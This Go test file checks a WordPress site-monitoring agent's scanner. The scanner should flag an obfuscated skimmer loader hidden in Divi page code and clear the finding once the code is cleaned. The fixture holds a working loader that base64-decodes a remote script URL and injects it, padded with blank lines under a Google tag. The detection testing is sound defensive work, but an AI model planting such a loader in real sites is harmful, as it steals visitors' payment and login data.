package agent

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/JCO-Digital/jman/internal/agent/scan"
	"github.com/JCO-Digital/jman/internal/models"
)

const gtagSnippet = "<!-- Google tag (gtag.js) -->\n<script async src=\"https://www.googletagmanager.com/gtag/js?id=AW-1\"></script>\n<script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'AW-1');</script>"

// skimmerLoader is the shape of a client site's skimmer loader, cut short (the
// whole one is in the scan package's tests).
const skimmerLoader = `<script>o=["createElement","script","src","Ly9kZWZzaGxkLmNvbS9qcy9jb3JlLmpzP3YyLjE"];var e=document[o[0]](o[1]);e[o[2]]=atob(o[3]);document.body.appendChild(e);</script>`

// setPageCode makes the sites' page code read as code, or fail with err.
func setPageCode(t *testing.T, code map[string]string, err error) {
	t.Helper()
	b, _ := json.Marshal(code)
	readPageCode = func(context.Context, siteIdentity, string) (string, error) {
		return "PHP Notice: something\n" + string(b), err
	}
}

func rules(findings []models.ScanFinding) []string {
	var got []string
	for _, f := range findings {
		got = append(got, f.Rule+" "+f.Severity)
	}
	return got
}

// Page code is part of the scan: a skimmer added to Divi's body code is a
// change and suspicious, a failed read changes nothing, and cleaning it
// clears the finding.
func TestScanPageCode(t *testing.T) {
	root, stateDir := t.TempDir(), t.TempDir()
	writeSiteFile(t, root, "index.php", "<?php")
	stubScan(t, map[string]string{"a.example": root})
	manifest := scanManifest("a.example")
	at := time.Now()
	run := func() *models.AgentScan {
		t.Helper()
		at = at.Add(2 * time.Hour)
		scans, done := collectScansForSites(context.Background(), stateDir, manifest, at)
		saveScans(stateDir, done, at)
		return scans["id-a"]
	}
	body := "divi_integration_body"
	path := scan.PageCodePrefix + "et_divi/" + body

	setPageCode(t, map[string]string{"et_divi/" + body: gtagSnippet}, nil)
	if first := run(); len(first.Findings) != 0 {
		t.Fatalf("first scan findings = %+v", first.Findings)
	}

	setPageCode(t, map[string]string{"et_divi/" + body: gtagSnippet + strings.Repeat("\n", 50) + skimmerLoader}, nil)
	second := run()
	if got := strings.Join(rules(second.Findings), ", "); got != "page-code-change medium, page-code-suspicious high" {
		t.Fatalf("second scan findings = %s", got)
	}
	if f := second.Findings[1]; f.Path != path || !strings.Contains(f.Detail, "encoded-script-loader") || !strings.Contains(f.Detail, "padded-script") {
		t.Fatalf("suspicious finding = %+v", f)
	}

	setPageCode(t, nil, errors.New("wp-cli failed"))
	if third := run(); len(third.Findings) != 0 || len(third.Cleared) != 0 {
		t.Fatalf("scan with unreadable page code = %+v", third)
	}

	setPageCode(t, map[string]string{"et_divi/" + body: gtagSnippet}, nil)
	fourth := run()
	if got := strings.Join(rules(fourth.Findings), ", "); got != "page-code-change medium" {
		t.Fatalf("fourth scan findings = %s", got)
	}
	cleared := map[string]string{}
	for _, c := range fourth.Cleared {
		cleared[c.Rule] = c.Detail
	}
	if cleared[scan.RulePageCodeSuspicious] != scan.ClearedReplaced {
		t.Fatalf("cleared = %+v", fourth.Cleared)
	}
}

// A baseline from before page code was read takes the page code in without
// reporting it as changed, but a skimmer already there is reported.
func TestScanPageCodeAfterUpgrade(t *testing.T) {
	root, stateDir := t.TempDir(), t.TempDir()
	writeSiteFile(t, root, "index.php", "<?php")
	stubScan(t, map[string]string{"a.example": root})
	manifest := scanManifest("a.example")
	at := time.Now()

	// The older agent read no page code.
	setPageCode(t, nil, errors.New("not read yet"))
	scans, done := collectScansForSites(context.Background(), stateDir, manifest, at)
	saveScans(stateDir, done, at)
	if scans["id-a"] == nil {
		t.Fatal("no first scan")
	}

	setPageCode(t, map[string]string{
		"et_divi/divi_integration_body": gtagSnippet + strings.Repeat("\n", 50) + skimmerLoader,
		"widget_text/4":                 "<div class=\"TA_selfserveprop\"></div><script src=\"https://www.jscache.com/wejs?wtype=selfserveprop\"></script>",
	}, nil)
	at = at.Add(2 * time.Hour)
	scans, _ = collectScansForSites(context.Background(), stateDir, manifest, at)
	if got := strings.Join(rules(scans["id-a"].Findings), ", "); got != "page-code-suspicious high" {
		t.Fatalf("findings after upgrade = %s", got)
	}
}
